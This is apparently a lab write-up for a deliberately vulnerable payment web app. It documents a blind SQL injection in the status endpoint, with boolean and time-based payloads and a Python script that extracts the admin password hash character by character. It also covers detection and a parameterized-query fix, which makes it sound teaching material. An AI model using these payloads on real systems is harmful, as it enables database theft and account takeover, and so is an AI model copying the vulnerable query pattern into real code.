# Blind SQL Injection - Status Page

## Overview

The payment status page is vulnerable to **Blind SQL Injection**. The application only shows whether a payment exists or not (TRUE/FALSE), without revealing actual data or error messages. This allows attackers to extract sensitive information through boolean-based blind SQL injection.

## Vulnerability Details

**Location**: `/status?id=<payment_id>` endpoint  
**Vulnerable Parameter**: `id` (GET parameter)  
**Vulnerable Code**:
```python
# VULNERABLE: Using string formatting with user input
query = f"SELECT 1 FROM payments WHERE user_id = {current_user.id} AND id = {payment_id}"
cursor.execute(query)
result = cursor.fetchone()
payment_found = result is not None  # Only TRUE/FALSE signal
```

## Response Signal Table

| Condition | Response | Signal |
|-----------|----------|--------|
| Query returns result | **Payment details displayed** (ID, amount, recipient, etc.) | TRUE |
| Query returns no result | "❌ Payment Not Found" | FALSE |
| Syntax error (suppressed) | "❌ Payment Not Found" | FALSE |

## How Blind SQL Injection Works

The application provides **two distinct responses**:
- **Payment details displayed** → The SQL condition evaluated to TRUE (shows full payment info)
- **"Payment Not Found"** → The SQL condition evaluated to FALSE (or error)

Attackers can craft SQL conditions that reveal information by observing whether payment details are shown (TRUE) or the "not found" message appears (FALSE).

## Exploitation Techniques

### 1. Basic Testing

Valid payment ID (assuming you own payment #1):
```
URL: /status?id=1
Response: ✅ Payment details displayed (TRUE)
Shows: Payment ID, Amount, Recipient, Description, Status, Date
```

Invalid payment ID:
```
URL: /status?id=99999
Response: ❌ "Payment Not Found" (FALSE)
```

### 2. Boolean-Based Data Extraction

#### Test if admin user exists:
```
URL: /status?id=1 AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0
Response: ✅ Payment details displayed (TRUE - admin exists)

URL: /status?id=1 AND (SELECT COUNT(*) FROM users WHERE username='hacker') > 0
Response: ❌ "Payment Not Found" (FALSE - hacker doesn't exist)
```

#### Extract first character of admin's password hash:
```
URL: /status?id=1 AND (SELECT SUBSTRING(password_hash, 1, 1) FROM users WHERE username='admin') = 'c'
Response: ✅ Payment details displayed (TRUE - first char is 'c')

URL: /status?id=1 AND (SELECT SUBSTRING(password_hash, 1, 1) FROM users WHERE username='admin') = 'a'
Response: ❌ "Payment Not Found" (FALSE - first char is NOT 'a')
```

#### Extract second character:
```
URL: /status?id=1 AND (SELECT SUBSTRING(password_hash, 2, 1) FROM users WHERE username='admin') = '5'
Response: ✅ Payment details displayed (TRUE - second char is '5')
```

### 3. Enumerate Database Tables

```
URL: /status?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0
Response: ✅ Payment details displayed (TRUE - users table exists)

URL: /status?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='passwords') > 0
Response: ❌ "Payment Not Found" (FALSE - passwords table doesn't exist)
```

### 4. Extract Database Version

```
URL: /status?id=1 AND (SELECT SUBSTRING(version(), 1, 8)) = 'PostgreS'
Response: ✅ Payment details displayed (TRUE - PostgreSQL database)
```

### 5. Count Records

```
URL: /status?id=1 AND (SELECT COUNT(*) FROM users) > 5
Response: Check if payment details shown (TRUE) or not found (FALSE)
```

### 6. Check Admin Privileges

```
URL: /status?id=1 AND (SELECT is_admin FROM users WHERE username='alice') = TRUE
Response: ❌ "Payment Not Found" (FALSE - alice is not admin)

URL: /status?id=1 AND (SELECT is_admin FROM users WHERE username='admin') = TRUE
Response: ✅ Payment details displayed (TRUE - admin has admin privileges)
```

## Complete Attack Example

### Goal: Extract admin's password hash

**Step 1: Verify admin exists**
```
/status?id=1 AND (SELECT COUNT(*) FROM users WHERE username='admin') = 1
Response: ✅ Payment details displayed (TRUE)
```

**Step 2: Extract hash character by character**
```python
import requests

session = requests.Session()
# Login first as alice or bob
session.post('http://localhost:5000/login', data={
    'username': 'alice',
    'password': 'Welcome123!'
})

hash_chars = "0123456789abcdef"
extracted_hash = ""

for position in range(1, 33):  # MD5 is 32 hex characters
    for char in hash_chars:
        # Build the SQL injection payload
        payload = f"1 AND (SELECT SUBSTRING(password_hash, {position}, 1) FROM users WHERE username='admin') = '{char}'"
        
        response = session.get(f'http://localhost:5000/status?id={payload}')
        
        # Check if payment details are shown (TRUE) or "Payment Not Found" (FALSE)
        if "Payment Found" in response.text and "Payment ID:" in response.text:
            extracted_hash += char
            print(f"Position {position}: {char} | Hash: {extracted_hash}")
            break

print(f"\n[+] Extracted hash: {extracted_hash}")
print(f"[+] Crack at: https://crackstation.net/")
```

**Expected Output:**
```
Position 1: c | Hash: c
Position 2: 5 | Hash: c5
Position 3: 3 | Hash: c53
Position 4: e | Hash: c53e
...
Position 32: 0 | Hash: c53e479b03b3220d3d56da88c4cace20

[+] Extracted hash: c53e479b03b3220d3d56da88c4cace20
[+] Crack at: https://crackstation.net/
[+] Cracked password: P@$$w0rd
```

**Step 3: Login as admin**
```
Username: admin
Password: P@$$w0rd
Result: Full access to admin account!
```

## Time-Based Blind SQLi (Alternative)

If boolean responses aren't clear enough, use timing attacks:

```
URL: /status?id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)

If condition is TRUE: Response takes 5+ seconds
If condition is FALSE: Response is immediate
```

Test if first character of password is 'c':
```
URL: /status?id=1 AND (SELECT CASE WHEN (SUBSTRING((SELECT password_hash FROM users WHERE username='admin'), 1, 1) = 'c') THEN pg_sleep(5) ELSE pg_sleep(0) END)

Response time:
- 5+ seconds → First char IS 'c' (TRUE)
- <1 second → First char is NOT 'c' (FALSE)
```

## Demo Payloads

### Quick Demo 1: Verify vulnerability
```
1. Valid payment:
   /status?id=1
   ✅ Payment details displayed

2. Test injection (TRUE):
   /status?id=1 AND 1=1
   ✅ Payment details displayed (TRUE)

3. Test injection (FALSE):
   /status?id=1 AND 1=2
   ❌ "Payment Not Found" (FALSE)
```

### Quick Demo 2: Extract data
```
1. Check if admin exists:
   /status?id=1 AND (SELECT COUNT(*) FROM users WHERE username='admin') = 1
   ✅ Payment details displayed (admin exists)

2. First char of admin hash:
   /status?id=1 AND (SELECT SUBSTRING(password_hash, 1, 1) FROM users WHERE username='admin') = 'c'
   ✅ Payment details displayed (first char is 'c')

3. Second char of admin hash:
   /status?id=1 AND (SELECT SUBSTRING(password_hash, 2, 1) FROM users WHERE username='admin') = '5'
   ✅ Payment details displayed (second char is '5')
```

## Attack Chain

```
┌─────────────────────────────────────┐
│ 1. Login as regular user (alice)    │
│    Username: alice                  │
│    Password: Welcome123!            │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ 2. Use blind SQLi to enumerate      │
│    - Database tables                │
│    - Column names                   │
│    - Usernames                      │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ 3. Extract admin password hash      │
│    Character by character:          │
│    c53e479b03b3220d3d56da88c4cace20 │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ 4. Crack hash on CrackStation       │
│    Result: P@$$w0rd                 │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ 5. Login as admin                   │
│    Username: admin                  │
│    Password: P@$$w0rd               │
└─────────────────────────────────────┘
```

## Why This Is Dangerous

1. **No error messages** → Harder to detect than error-based SQLi
2. **Bypasses authentication** → Can escalate from regular user to admin
3. **Full database access** → Can extract any data from any table
4. **Stealth** → Looks like normal payment lookups in logs
5. **Works after authentication** → Even with "secure" login, post-auth pages are vulnerable

## Detection Methods

Look for:
1. **Unusual payment IDs**: 
   - `1 AND 1=1`
   - `1 UNION SELECT`
   - Multiple subqueries
2. **Sequential testing patterns**: Testing characters a-z, 0-9 systematically
3. **High request volume**: Extracting 32-character hash = 32-512 requests
4. **Timing patterns**: Regular delays if using time-based SQLi
5. **Status checks for non-existent payments**: IDs > 100000

## Mitigation

### ❌ Vulnerable Code (Current):
```python
query = f"SELECT 1 FROM payments WHERE user_id = {current_user.id} AND id = {payment_id}"
cursor.execute(query)
```

### ✅ Secure Code (Fixed):
```python
query = "SELECT * FROM payments WHERE user_id = %s AND id = %s"
cursor.execute(query, (current_user.id, payment_id))
```

### Additional Security Measures:

1. **Input Validation**: Ensure payment_id is numeric
   ```python
   if not payment_id.isdigit():
       flash("Invalid payment ID", "error")
       return redirect(url_for('dashboard'))
   ```

2. **Rate Limiting**: Limit status checks per user per minute

3. **Web Application Firewall (WAF)**: Detect SQL injection patterns

4. **Logging**: Alert on suspicious patterns in payment_id parameter

5. **Least Privilege**: Database user should only access required tables

## Educational Value

This vulnerability demonstrates:
- How **boolean logic** can leak entire databases
- Why **all user input** must be sanitized, not just login forms
- The power of **automated exploitation** for blind SQLi
- How **post-authentication vulnerabilities** are equally critical
- Why **error suppression** doesn't prevent SQL injection
